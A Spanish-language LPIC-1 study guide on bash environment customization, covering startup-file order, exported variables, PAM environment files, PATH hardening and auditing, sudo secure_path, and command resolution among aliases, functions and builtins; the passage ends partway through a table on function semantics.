# 105.1 — Personalizar y usar el entorno del shell

**Certificación:** LPIC-1 (LPI 101-500 + 102-500, versión 5.0)
**Tema 105.1 — peso 6.25** (el Tema 105, *Shells and Shell Scripting*, se evalúa en **102-500**)
**Archivos, términos y utilidades clave:** `.` (punto), `source`, `/etc/bash.bashrc`, `/etc/profile`, `env`, `export`, `set`, `unset`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.bashrc`, `~/.bash_logout`, `function`, `alias`, listas

---

## 1. El problema en producción: un entorno es un contrato, no una comodidad

### 1.1 Cuatro arquetipos de incidente que vas a encontrar en el campo

Todo SRE termina depurando alguna variante de estos. Los cuatro son *el mismo bug*: una suposición sobre qué archivos de arranque lee un shell.

| # | Síntoma | Causa subyacente |
|---|---|---|
| 1 | "El script de backup funciona cuando lo ejecuto yo, pero el job de cron produce archivos vacíos en silencio." | `cron` lanza un shell **no interactivo y no de login**. No lee ni `/etc/profile` ni `~/.bashrc`. El `PATH` es el pelado `/usr/bin:/bin`, así que no encuentra `/opt/toolchain/bin/restic`; el estado de salida del pipeline queda enmascarado. |
| 2 | "`ansible` y `rsync` fallan contra node07 con `Protocol error` / `unexpected tag`." | Alguien agregó `echo "Welcome to $(hostname)"` a `~/.bashrc`. `sshd` ejecuta un bash no interactivo que **sí** lee `~/.bashrc` (caso especial de SSH), así que el banner se inyecta en el flujo del protocolo binario. |
| 3 | "Los nuevos ingresos reciben los alias de la plataforma; los que entraron en 2023, no." | El equipo distribuye la configuración del shell por `/etc/skel`, que se copia **solo al crear la cuenta**. Dos años de deriva, sin bucle de reconciliación. |
| 4 | "El servicio Java arranca bien bajo `systemd` después de un `systemctl start` manual, pero no en el arranque; `JAVA_HOME` está sin definir." | `systemd` **no** ejecuta un shell. `PAM`, `/etc/profile` y `~/.bashrc` quedan todos fuera de juego. El entorno de la unidad proviene únicamente de `Environment=`, `EnvironmentFile=`, `DefaultEnvironment=` y los generadores de entorno. |

### 1.2 Por qué esto es un asunto de sistemas distribuidos y no un pasatiempo de dotfiles

A escala de flota, el entorno del shell es un **plano de configuración** con las mismas propiedades que cualquier otro:

- **Múltiples escritores, sin coordinación.** `/etc/environment` (PAM), `/etc/profile`, `/etc/profile.d/*.sh`, `/etc/bash.bashrc`, `~/.bash_profile`, `~/.bashrc`, `~/.ssh/environment`, el `secure_path` de `sudoers`, el `PATH` compilado dentro de `systemd`, las capas `ENV` de contenedores. Gana el último que escribe, y "último" depende del punto de entrada.
- **Evaluación dependiente del contexto.** El mismo archivo da resultados distintos bajo `ssh`, `su -`, `cron`, `systemd`, `kubectl exec` y un gestor de sesiones gráficas. Una configuración que no podés evaluar de forma determinista es una configuración que no podés revisar.
- **Un límite de seguridad.** El orden del `PATH` es una decisión de ejecución de código que se toma en cada comando. Un directorio escribible al principio del `PATH`, o un campo vacío (`::`), es una primitiva de escalada de privilegios.
- **Un presupuesto de latencia.** Cada login lee toda la cadena. Un `PROMPT_COMMAND` que invoca `git status` sobre un monorepo de 40 GB convierte cada pulsación de `Enter` en 300 ms de E/S, en cada nodo, para cada operador, para siempre.

### 1.3 El modelo mental que hay que sostener

> Un shell es una máquina de estados cuyo **estado inicial** lo eligen dos booleanos ortogonales — *login* e *interactivo* — más un flag de emulación POSIX. Todo bug de entorno en este tema es un desajuste entre el estado que supusiste y el estado que obtuviste.

La regla de diseño que se desprende de ahí, y la conclusión más valiosa de 105.1:

- **`~/.bash_profile` / `/etc/profile`** → cosas que deben ser **heredadas por los hijos**: `PATH`, `LANG`, `JAVA_HOME`, `EDITOR`. Variables exportadas, calculadas una vez por sesión.
- **`~/.bashrc` / `/etc/bash.bashrc`** → cosas que solo tienen sentido para un **humano frente a un teclado**: alias, prompt, completado, `shopt`. Nunca se heredan, así que deben reestablecerse en cada shell.
- **Todo aquello de lo que dependa una máquina** → un mecanismo explícito y ajeno al shell: `EnvironmentFile=`, `ENV` de contenedor, `sudoers secure_path`. Nunca un dotfile.

---

## 2. La máquina de estados de los archivos de arranque

### 2.1 Clasificación

| Propiedad | Definición | Cómo lo decide bash |
|---|---|---|
| **Shell de login** | Primer shell de una sesión; se espera que establezca el entorno de la sesión | `argv[0]` empieza con `-` (p. ej. `-bash`), o se pasó `--login`/`-l` |
| **Interactivo** | stdin/stderr conectados a una terminal, sin argumentos que no sean opciones | Autodetectado, o forzado con `-i` |
| **Modo POSIX** | Emula el `sh` histórico | Invocado como `sh`, `--posix`, `set -o posix`, o `POSIXLY_CORRECT` definido en el entorno al arrancar |

### 2.2 La matriz de decisión autoritativa

Comportamiento de bash upstream (Bash Reference Manual §6.2, *Bash Startup Files*):

| Invocación | Login | Interactivo | Archivos leídos, en orden | `~/.bash_logout` |
|---|:---:|:---:|---|:---:|
| Login por consola, `ssh host`, `su -`, `sudo -i`, `bash -l` | ✅ | ✅ | `/etc/profile` → *el primero legible de* `~/.bash_profile`, `~/.bash_login`, `~/.profile` | ✅ |
| `bash`, `xterm`, `screen`, `tmux`, `su`, `sudo -s` | ❌ | ✅ | `~/.bashrc` (+ `/etc/bash.bashrc` en distros que compilan `SYS_BASHRC`) | ❌ |
| `bash script.sh`, `./script.sh`, `cron`, `at` | ❌ | ❌ | **Nada** — salvo `$BASH_ENV`, si está definido y no vacío | ❌ |
| `ssh host 'command'` | ❌ | ❌ | `~/.bashrc` — el caso especial de conexión de red | ❌ |
| `bash -lc 'command'` | ✅ | ❌ | `/etc/profile` → `~/.bash_profile`/`~/.bash_login`/`~/.profile` | ✅ |
| Invocado como `sh`, login+interactivo | ✅ | ✅ | `/etc/profile` → `~/.profile` solamente | ❌ |
| Invocado como `sh`, interactivo sin login | ❌ | ✅ | `$ENV` solamente | ❌ |
| Invocado como `sh`, no interactivo | ❌ | ❌ | **Nada** (`$BASH_ENV` *no* se consulta) | ❌ |
| `--posix`, interactivo | – | ✅ | `$ENV` solamente | ❌ |
| `--noprofile` / `--norc` | – | – | Suprime la cadena de profile / el archivo rc, respectivamente | – |

Tres consecuencias que generan la mayoría de los tickets reales:

1. **La cadena de profile se detiene en el primer acierto.** Si existe `~/.bash_profile`, `~/.profile` *nunca se lee*. Instalar un `~/.bash_profile` es la forma de deshabilitar silenciosamente el `~/.profile` de un usuario.
2. **Un shell de login no lee `~/.bashrc`.** Por eso todo esqueleto `~/.bash_profile` de cualquier distro contiene un explícito `[ -f ~/.bashrc ] && . ~/.bashrc`. Sacalo y tus alias desaparecen de los logins por consola mientras sobreviven en `tmux`.
3. **`$BASH_ENV` es el único gancho hacia shells no interactivos.** Y por lo tanto es también una superficie de ataque y un superpoder de depuración.

### 2.3 Determinar empíricamente el estado del shell en el que estás

```bash
$ shopt -q login_shell && echo "login" || echo "non-login"
non-login

$ echo "$-"
himBH

$ [[ $- == *i* ]] && echo "interactive" || echo "non-interactive"
interactive

$ echo "$SHLVL"
1

$ shopt -q -o posix && echo "posix mode" || echo "bash mode"
bash mode
```

`$-` es el conjunto de opciones activas de una sola letra: `h` hashall, `i` interactivo, `m` control de trabajos, `B` expansión de llaves, `H` expansión de historial. En un script se reduce a `hB` — la `i` faltante **es** el diagnóstico.

Una sonda de una línea que podés ejecutar contra cualquier punto de entrada:

```bash
$ cat > /usr/local/bin/shellstate <<'EOF'
#!/usr/bin/env bash
printf 'argv0=%s login=%s interactive=%s posix=%s shlvl=%s\n' \
    "$0" \
    "$(shopt -q login_shell && echo yes || echo no)" \
    "$([[ $- == *i* ]] && echo yes || echo no)" \
    "$(shopt -q -o posix && echo yes || echo no)" \
    "${SHLVL}"
printf 'PATH=%s\n' "$PATH"
EOF
$ chmod 0755 /usr/local/bin/shellstate
```

Ahora medí cada punto de entrada en lugar de adivinar:

```bash
$ shellstate
argv0=/usr/local/bin/shellstate login=no interactive=no posix=no shlvl=2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/toolchain/bin

$ ssh sre@node01 shellstate
argv0=/usr/local/bin/shellstate login=no interactive=no posix=no shlvl=2
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

$ ssh sre@node01 'bash -lc shellstate'
argv0=/usr/local/bin/shellstate login=no interactive=no posix=no shlvl=3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/toolchain/bin
```

La segunda y la tercera salida, una al lado de la otra, son toda la lección: `ssh host cmd` **no** obtuvo `/opt/toolchain/bin`, porque `/etc/profile.d/` nunca fue leído.

### 2.4 Diferencias entre distribuciones — no supongas, verificá

Bash upstream lee `/etc/bash.bashrc` para shells interactivos sin login **solo si fue compilado con `-DSYS_BASHRC`**. Las distros difieren, y los archivos esqueleto compensan de maneras distintas.

| Distro | Profile del sistema | rc del sistema | Mecanismo | Intérprete de `profile.d` |
|---|---|---|---|---|
| Debian / Ubuntu | `/etc/profile` | `/etc/bash.bashrc` | `SYS_BASHRC` compilado; `/etc/profile` también lo lee para shells de login | `/etc/profile` puede ser leído por **dash** → los archivos deben ser `sh` POSIX |
| RHEL / Fedora / Rocky | `/etc/profile` | `/etc/bashrc` | Leído **explícitamente** por el `~/.bashrc` del esqueleto | `/etc/profile` lee `*.sh`, ignora `*.csh` |
| SUSE | `/etc/profile` (+ `/etc/profile.local`) | `/etc/bash.bashrc` (+ `.local`) | Los archivos del proveedor se sobrescriben al actualizar; `.local` es tuyo | `sh` POSIX |
| Alpine (busybox `ash`) | `/etc/profile` | `$ENV`, convencionalmente `/etc/shell.shrc` | Sin bash por defecto | `ash` |

Verificá la ruta compilada en lugar de confiar en la documentación:

```bash
$ strings "$(command -v bash)" | grep -E '^/etc/(bash\.)?bashrc$'
/etc/bash.bashrc

$ bash --version | head -1
GNU bash, version 5.2.21(1)-release (x86_64-pc-linux-gnu)
```

**Regla de portabilidad para `/etc/profile.d/*.sh`:** en sistemas de la familia Debian, `/etc/profile` también lo ejecuta `dash` cuando `sh` es un shell de login. Los bashismos (`[[ ]]`, arrays, `local` con atributos, `source`) van a emitir errores en cada login. Escribí los fragmentos de `profile.d` en `sh` POSIX estricto, y protegé el contenido exclusivo de bash con `[ -n "${BASH_VERSION-}" ]`.

### 2.5 Referencia de puntos de entrada: qué inicializa realmente cada contexto

| Punto de entrada | Tipo de shell | Sesión PAM (`/etc/environment`) | Lee `profile.d` | Lee `~/.bashrc` |
|---|---|:---:|:---:|:---:|
| Login por consola física/serie (`login`) | login, interactivo | ✅ | ✅ | vía el gancho de `~/.bash_profile` |
| Sesión interactiva de `sshd` | login, interactivo | ✅ | ✅ | vía el gancho |
| `ssh host 'cmd'` | sin login, no interactivo | ✅ | ❌ | ✅ (caso especial de red) |
| `ssh -t host 'cmd'` | sin login, **interactivo** | ✅ | ❌ | ✅ |
| `scp` / `sftp` / `rsync` | sin login, no interactivo | ✅ | ❌ | ✅ ← **la salida aquí corrompe la transferencia** |
| `su user` | sin login, interactivo | ✅ (pila PAM de `su`) | ❌ | ✅ |
| `su - user` | login, interactivo | ✅ | ✅ | vía el gancho |
| `sudo cmd` | ningún shell | ✅ (PAM de `sudo`) | ❌ | ❌ |
| `sudo -i` | login, interactivo | ✅ | ✅ | vía el gancho |
| `sudo -s` | sin login, interactivo | ✅ | ❌ | ✅ |
| Job de `cron` | `SHELL=/bin/sh`, sin login, no interactivo | ✅ (`pam_env` vía `crond`) | ❌ | ❌ |
| Servicio de `systemd` | **ningún shell** | ❌ | ❌ | ❌ |
| Docker `ENTRYPOINT ["/app"]` | ningún shell | ❌ | ❌ | ❌ |
| Docker `CMD ["bash","-lc","..."]` | login, no interactivo | ❌ | ✅ | ❌ |
| `kubectl exec -it pod -- bash` | sin login, interactivo | ❌ | ❌ | ✅ |
| Sesión gráfica GNOME/GDM | `/etc/gdm/Xsession` lee `/etc/profile` + `~/.profile` | ✅ | ✅ | ❌ |

### 2.6 Compromisos de ubicación: ¿dónde debería vivir un ajuste dado?

| Ubicación | Alcance | ¿Aplica a lo no interactivo? | ¿Heredado por los hijos? | ¿Se reconcilia en hosts existentes? | Usar para |
|---|---|:---:|:---:|:---:|---|
| `/etc/environment` (`pam_env`) | Todos los logins PAM, shells y no-shells | ✅ | ✅ | ✅ | `LANG`, variables de proxy — **sin expansión, sin scripting** |
| `/etc/profile.d/*.sh` | Todos los shells de login, todos los usuarios | ❌ | ✅ | ✅ | Extensiones de `PATH`, `JAVA_HOME`, variables exportadas de plataforma |
| `/etc/profile` | Igual, pero propiedad del proveedor | ❌ | ✅ | ⚠️ se sobrescribe al actualizar | Nunca editar directamente |
| `/etc/bash.bashrc` (`/etc/bashrc`) | Bash interactivo, todos los usuarios | ❌ | ❌ | ✅ | Política de prompt, `TMOUT`, alias globales |
| `~/.bash_profile` | Un usuario, shells de login | ❌ | ✅ | ❌ (por usuario) | Exports personales |
| `~/.bashrc` | Un usuario, shells interactivos | ⚠️ caso SSH | ❌ | ❌ | Alias y funciones personales |
| `/etc/skel/*` | Solo usuarios **futuros** | – | – | ❌ **nunca** | Solo valores iniciales de arranque |
| `$BASH_ENV` | Bash no interactivo | ✅ | solo si se exporta | ✅ | Instrumentación de emergencia; sensible a la seguridad |
| `EnvironmentFile=` de `systemd` | Una unidad | ✅ | ✅ | ✅ | Cualquier cosa de la que dependa un servicio |
| `secure_path` de `sudoers` | Invocaciones de `sudo` | ✅ | ✅ | ✅ | El `PATH` privilegiado |

---

## 3. Variables: estado del shell frente a entorno del proceso

### 3.1 La distinción sobre la que se apoya todo

Una **variable de shell** vive en la memoria propia del shell. Una **variable de entorno** es un miembro del array `environ` (`environ(7)`) que `execve(2)` copia a cada proceso hijo. `export` es la operación que mueve una variable de shell al conjunto exportado.

```bash
$ REGION=eu-central-1            # shell variable only
$ echo "$REGION"
eu-central-1
$ bash -c 'echo "child sees: [$REGION]"'
child sees: []

$ export REGION
$ bash -c 'echo "child sees: [$REGION]"'
child sees: [eu-central-1]

$ declare -p REGION
declare -x REGION="eu-central-1"
```

El atributo `-x` en `declare -p` es la verdad de base para "¿está exportada?". Confirmalo a nivel del kernel:

```bash
$ tr '\0' '\n' < /proc/$$/environ | grep -c .
34
$ tr '\0' '\n' < /proc/$$/environ | grep '^REGION='
REGION=eu-central-1
```

### 3.2 Comparación de herramientas

| Comando | Informa | ¿Incluye no exportadas? | ¿Incluye funciones? | ¿Puede modificar el entorno del hijo? | Notas |
|---|---|:---:|:---:|:---:|---|
| `set` | Todas las variables de shell **y** funciones | ✅ | ✅ | ❌ | Sin argumentos en modo POSIX: solo variables |
| `set -o` / `shopt -o` | Opciones del shell | – | – | – | No variables |
| `env` (sin argumentos) | Entorno del proceso | ❌ | Solo las exportadas | ✅ | Binario externo `/usr/bin/env` |
| `printenv` | Entorno del proceso | ❌ | ❌ | ❌ | `printenv VAR` sale con 1 si no está definida — scriptable |
| `export -p` | Variables exportadas | ❌ | – | ❌ | POSIX, reingresable |
| `declare -p` | Variables + atributos | ✅ | ❌ | ❌ | Solo bash, muestra `-i -a -A -r -x` |
| `compgen -e` | Solo nombres exportados | ❌ | ❌ | ❌ | Ideal para diffs automatizados |
| `cat /proc/PID/environ` | Entorno **al momento del exec** de otro proceso | ❌ | ❌ | ❌ | No refleja `setenv` posteriores |

Matiz crítico: `/proc/PID/environ` es una instantánea de lo que entregó `execve()`. Un demonio de larga duración que muta su propio entorno no mostrará el cambio ahí. Para un servicio en ejecución, confiá en la definición de la unidad, no en `/proc`.

### 3.3 Construir y destruir entornos deliberadamente

```bash
# Run with a pristine, empty environment
$ env -i /bin/bash --noprofile --norc -c 'env'
PWD=/home/sre
SHLVL=1
_=/usr/bin/env

# Per-command override, no leakage into the parent
$ LC_ALL=C sort -c /etc/passwd ; echo "$LC_ALL"
                                            # empty: the assignment was scoped to sort

# Remove a variable for one command only
$ env -u LD_PRELOAD /opt/app/bin/worker

# Auto-export every subsequent assignment (allexport)
$ set -a
$ . /etc/platform/release.env
$ set +a
$ declare -p PLATFORM_RELEASE
declare -x PLATFORM_RELEASE="2026.08.3"
```

`set -a` + `.` es la forma idiomática de cargar un archivo `KEY=value` en el entorno; es exactamente lo que hace nativamente el `EnvironmentFile=` de `systemd`, y es la razón por la que esos archivos no deben contener sintaxis de shell que no querrías ejecutar.

Eliminación e inmutabilidad:

```bash
$ unset REGION                  # removes variable and its export attribute
$ export -n JAVA_HOME           # keeps the shell variable, drops the export attribute

$ readonly -p | grep TMOUT
declare -rx TMOUT="900"
$ TMOUT=0
bash: TMOUT: readonly variable
$ unset TMOUT
bash: unset: TMOUT: cannot unset: readonly variable
```

`readonly` es la forma en que una base de endurecimiento impone un tiempo de espera de sesión inactiva que un operador no puede deshabilitar a la ligera dentro del shell. Es un *reductor de velocidad* de política, no un control de seguridad — el usuario todavía puede hacer `exec bash --norc`.

### 3.4 Alcance: subshell frente a proceso hijo

Dos límites distintos, frecuentemente confundidos:

```bash
$ COUNT=0
$ ( COUNT=99; echo "inside subshell: $COUNT" )
inside subshell: 99
$ echo "after subshell: $COUNT"
after subshell: 0

$ { COUNT=99; }          # group command: SAME shell
$ echo "after group: $COUNT"
after group: 99

$ echo one two three | while read -r a b c; do TOTAL=3; done
$ echo "after pipeline: [${TOTAL-unset}]"
after pipeline: [unset]          # the while ran in a subshell (last-pipeline element)

$ shopt -s lastpipe              # requires job control off (non-interactive, or set +m)
$ set +m
$ echo one two three | while read -r a b c; do TOTAL=3; done
$ echo "after lastpipe: [${TOTAL-unset}]"
after lastpipe: [3]
```

Esta es la causa número uno de "mi contador del bucle siempre da cero" en scripts de producción. Un subshell hereda *todas* las variables (exportadas o no) pero no propaga *nada* de vuelta salvo su estado de salida.

### 3.5 `pam_env` y `/etc/environment` — la capa previa al shell

`/etc/environment` **no es un script de shell**. Lo lee `pam_env(8)`, línea por línea, como `KEY=value`. Sin `export`, sin `$( )`, sin condicionales y — con la configuración por defecto — sin expansión de variables.

```bash
$ cat /etc/environment
LANG=en_US.UTF-8
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
HTTPS_PROXY="http://proxy.corp.internal:3128"
NO_PROXY="localhost,127.0.0.1,.svc,.cluster.local,10.0.0.0/8"

$ grep -rn pam_env /etc/pam.d/ | head -5
/etc/pam.d/login:session       required     pam_env.so readenv=1
/etc/pam.d/sshd:session        required     pam_env.so user_readenv=0
/etc/pam.d/su:session          required     pam_env.so readenv=1
/etc/pam.d/cron:session        required     pam_env.so
/etc/pam.d/runuser:session     required     pam_env.so
```

Por qué importa: `/etc/environment` llega a **cron y a sesiones PAM sin shell**, cosa que `/etc/profile.d` no puede. Es el lugar correcto para `LANG` y la configuración de proxy; es el lugar equivocado para cualquier cosa que requiera lógica.

Fijate en `user_readenv=0` en la pila de `sshd` — las distribuciones modernas deshabilitan `~/.pam_environment` porque un archivo de entorno escribible por el usuario y procesado por una pila PAM privilegiada es un vector clásico de escalada (esto fue territorio del tipo CVE-2010-3316 y la funcionalidad está obsoleta upstream).

### 3.6 La locale como dependencia de corrección

```bash
$ printf 'b\naB\nA\n' | LC_ALL=en_US.UTF-8 sort
A
aB
b
$ printf 'b\naB\nA\n' | LC_ALL=C sort
A
aB
b
$ printf 'Bob\nalice\nAlice\n' | LC_ALL=en_US.UTF-8 sort | tr '\n' ' '
alice Alice Bob
$ printf 'Bob\nalice\nAlice\n' | LC_ALL=C sort | tr '\n' ' '
Alice Bob alice
```

`sort | uniq`, `comm`, `join`, los rangos `[a-z]` y la salida de `date` cambian todos con la locale. La ejecución remota importa la locale del *cliente* cuando `sshd` tiene `AcceptEnv LANG LC_*` (el valor por defecto de la distro) y el cliente define `SendEnv`. Una laptop configurada en `de_DE.UTF-8` hará que el separador decimal de un script remoto sea una coma.

**Regla:** todo script no interactivo que analice texto define `export LC_ALL=C` (o `C.UTF-8`) al principio. Los humanos interactivos conservan su locale.

---

## 4. Ingeniería del `PATH`

### 4.1 Semántica sobre la que hay que ser exacto

`PATH` es una lista de directorios separados por dos puntos que se recorre de izquierda a derecha buscando un nombre de comando **que no contenga barras**. Tres propiedades tienen peso de seguridad:

| Construcción | Significado | Riesgo |
|---|---|---|
| `PATH=/usr/bin:/bin` | Dos entradas absolutas | referencia |
| `PATH=:/usr/bin` | **Campo vacío inicial = directorio actual** | troyano `./ls` |
| `PATH=/usr/bin:` | **Campo vacío final = directorio actual** | igual |
| `PATH=/usr/bin::/bin` | **Campo vacío en el medio = directorio actual** | igual |
| `PATH=.:/usr/bin` | CWD explícito, primero | el peor caso |
| `PATH=/usr/bin:.` | CWD explícito, último | typo-squatting (`sl`, `mkae`) |
| `PATH=~/bin:/usr/bin` | La virgulilla se expande al momento de la asignación en bash | se rompe bajo `sudo -u` |

Auditalo:

```bash
$ printf '%s\n' "${PATH//:/$'\n'}" | cat -A | head
/usr/local/sbin$
/usr/local/bin$
/usr/sbin$
/usr/bin$
/sbin$
/bin$
$                      # <-- empty field: current directory is in PATH

$ awk -F: '{for(i=1;i<=NF;i++) if($i=="" || $i==".") printf "field %d is CWD\n", i}' <<<"$PATH"
field 7 is CWD
```

Encontrá directorios escribibles por todos o por el grupo en la ruta de búsqueda — un hallazgo que pertenece a todo informe de endurecimiento:

```bash
$ IFS=: read -ra dirs <<<"$PATH"
$ for d in "${dirs[@]}"; do
>   [ -z "$d" ] && { echo "EMPTY FIELD -> CWD"; continue; }
>   [ -d "$d" ] || { echo "MISSING   $d"; continue; }
>   perm=$(stat -c '%A %U:%G' "$d")
>   case "$perm" in
>     *w*w*|*w*t*) echo "WRITABLE  $d ($perm)" ;;
>     *)           echo "ok        $d ($perm)" ;;
>   esac
> done
ok        /usr/local/sbin (drwxr-xr-x root:root)
ok        /usr/local/bin (drwxr-xr-x root:root)
ok        /usr/sbin (drwxr-xr-x root:root)
ok        /usr/bin (drwxr-xr-x root:root)
ok        /sbin (drwxr-xr-x root:root)
ok        /bin (drwxr-xr-x root:root)
WRITABLE  /opt/vendor/bin (drwxrwxr-x root:developers)
EMPTY FIELD -> CWD
```

### 4.2 Un mutador de `PATH` idempotente y seguro en POSIX

El ingenuo `export PATH="$PATH:/opt/toolchain/bin"` en `~/.bashrc` hace crecer la variable en cada shell anidado. Después de un `tmux` dentro de un `ssh` dentro de un `sudo -i`, `PATH` puede superar el kilobyte, y cada `execvp()` lo recorre entero.

```sh
# POSIX sh — safe for /etc/profile.d/ on Debian (dash) and RHEL (bash)
path_contains() {
    case ":${PATH}:" in
        *":$1:"*) return 0 ;;
        *)        return 1 ;;
    esac
}

path_prepend() {
    [ -d "$1" ] || return 0
    path_contains "$1" && return 0
    PATH="$1${PATH:+:$PATH}"
}

path_append() {
    [ -d "$1" ] || return 0
    path_contains "$1" && return 0
    PATH="${PATH:+$PATH:}$1"
}

path_remove() {
    PATH=$(printf '%s' "$PATH" | awk -v RS=: -v ORS=: -v r="$1" '$0 != r' \
           | sed 's/:$//')
}
```

Demostración de la idempotencia:

```bash
$ . /etc/profile.d/10-platform-path.sh
$ echo "$PATH"
/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ . /etc/profile.d/10-platform-path.sh
$ . /etc/profile.d/10-platform-path.sh
$ echo "$PATH"
/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ awk -v RS=: 'END{print NR" entries"}' <<<"$PATH"
7 entries
```

### 4.3 La tabla hash de comandos — el bug de "actualicé el binario y no cambió nada"

Bash cachea la ruta absoluta resuelta de cada comando ejecutado (opción `h`, activada por defecto).

```bash
$ hash
hits	command
   4	/usr/bin/kubectl
   1	/usr/bin/git

$ sudo install -m 0755 kubectl-1.31 /usr/local/bin/kubectl
$ kubectl version --client --output=yaml | head -3
clientVersion:
  gitVersion: v1.29.4          # <-- still the OLD binary from /usr/bin

$ type -a kubectl
kubectl is hashed (/usr/bin/kubectl)
kubectl is /usr/local/bin/kubectl
kubectl is /usr/bin/kubectl

$ hash -r                       # or: hash -d kubectl
$ type kubectl
kubectl is /usr/local/bin/kubectl
$ kubectl version --client --output=yaml | head -3
clientVersion:
  gitVersion: v1.31.0
```

Controles relacionados: `shopt -s checkhash` vuelve a verificar que la ruta cacheada exista antes de usarla; `set +h` deshabilita el hashing por completo (útil en shells de aprovisionamiento efímeros donde los binarios aparecen a mitad de ejecución).

### 4.4 El `PATH` a través de fronteras de privilegio

```bash
$ echo "$PATH"
/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ sudo printenv PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ sudo grep -E 'secure_path|env_reset|env_keep' /etc/sudoers
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults	env_keep += "LANG LC_* http_proxy https_proxy no_proxy"
```

`env_reset` (por defecto) descarta el entorno del invocante salvo una lista permitida; `secure_path` luego impone un `PATH` fijo. Esto es deliberado: heredar un `PATH` controlado por el usuario dentro de un comando de root es una escalada de manual. Si tu utillaje de plataforma debe poder invocarse bajo `sudo`, extendé `secure_path` en un drop-in dedicado — nunca deshabilites `env_reset`.

```bash
$ sudo visudo -f /etc/sudoers.d/20-platform-path
$ sudo cat /etc/sudoers.d/20-platform-path
Defaults    secure_path="/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
$ sudo visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/20-platform-path: parsed OK
```

`PATH` medido por contexto de ejecución en un nodo Debian 12 de fábrica:

| Contexto | `PATH` observado |
|---|---|
| Login interactivo (`ssh`), root | `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` |
| Login interactivo, sin privilegios | `/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games` |
| `ssh host 'printenv PATH'` | `/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games` |
| Job de usuario de `crontab -l` | `/usr/bin:/bin` (incorporado en Vixie/ISC cron) |
| `/etc/crontab` / `/etc/cron.d` | `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin` (definido en el archivo) |
| Servicio de sistema de `systemd` | `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` (valor compilado por defecto) |
| `sudo cmd` | valor de `secure_path` |
| Imagen Docker derivada de `scratch` | sin definir → `execvp` usa `confstr(_CS_PATH)` = `/bin:/usr/bin` |

```bash
$ systemctl show-environment
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ systemd-run -q --wait --pipe /usr/bin/printenv PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ crontab -l | head -3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAILTO=sre-oncall@example.com
17 3 * * * /opt/toolchain/bin/backup-run --profile nightly
```

---

## 5. Funciones, alias, builtins y listas

### 5.1 Orden de resolución de comandos — la referencia

Cuando bash ejecuta un comando simple cuyo nombre no contiene barras:

1. **Expansión de alias** — la realiza el parser, sobre la primera palabra de un comando, y solo cuando los alias están habilitados (shells interactivos, o `shopt -s expand_aliases`).
2. **Palabras reservadas** (`if`, `for`, `function`, `time`, `[[`, `{`) — se reconocen cuando están sin comillas y en posición de comando.
3. **Funciones de shell**
4. **Builtins del shell** (`cd`, `export`, `read`, `type`, `hash`, `:`)
5. **Tabla hash**, y luego búsqueda en el **`PATH`** de ejecutables externos

`type -a` muestra toda la pila en orden y es el instrumento de diagnóstico correcto:

```bash
$ alias ls='ls --color=auto'
$ ls() { command ls -lh "$@"; }
$ type -a ls
ls is aliased to `ls --color=auto'
ls is a function
ls () 
{ 
    command ls -lh "$@"
}
ls is /usr/bin/ls

$ type -t ls
alias
$ type -P ls                    # force PATH lookup, skip everything else
/usr/bin/ls
```

Vías de escape, de la más específica a la menos:

| Necesidad | Mecanismo | Ejemplo |
|---|---|---|
| Saltear solo el alias | Poné comillas o barra invertida en el nombre | `\ls` o `'ls'` |
| Saltear el alias **y** la función | `command` | `command ls -lh` |
| Forzar un builtin por encima de una función | `builtin` | `builtin cd /tmp` |
| Forzar un binario externo | Ruta absoluta o `$(type -P x)` | `/usr/bin/time` vs. la palabra clave `time` |
| Deshabilitar un builtin por completo | `enable -n` | `enable -n echo` → gana `/usr/bin/echo` |

```bash
$ type echo
echo is a shell builtin
$ enable -n echo
$ type echo
echo is /usr/bin/echo
$ enable echo
$ type echo
echo is a shell builtin
```

### 5.2 Anatomía de una función para código de shell en producción

```bash
# POSIX-portable form (preferred for /etc/profile.d)
retry() {
    _max=$1; shift
    _n=0
    until "$@"; do
        _n=$((_n + 1))
        if [ "$_n" -ge "$_max" ]; then
            printf 'retry: giving up after %d attempts: %s\n' "$_max" "$*" >&2
            return 1
        fi
        sleep $(( _n * 2 ))
    done
    return 0
}

# Bash form with local scoping and strict discipline
kctx() {
    local ctx="${1:?usage: kctx <context>}"
    local -r kubeconfig="${KUBECONFIG:-$HOME/.kube/config}"

    if ! kubectl --kubeconfig="$kubeconfig" config get-contexts -o name \
         | grep -qxF -- "$ctx"; then
        printf 'kctx: unknown context %q\n' "$ctx" >&2
        return 2
    fi
    kubectl --kubeconfig="$kubeconfig" config use-context "$ctx" >/dev/null
    printf 'context -> %s\n' "$ctx"
}
```

Semántica clave:

| Característica | Comportamiento | Trampa |
|---|---|---|
| `local x` | Alcance dinámico: visible para los llamados, no para el llamador | No es POSIX; `dash` tiene un `local` más débil |
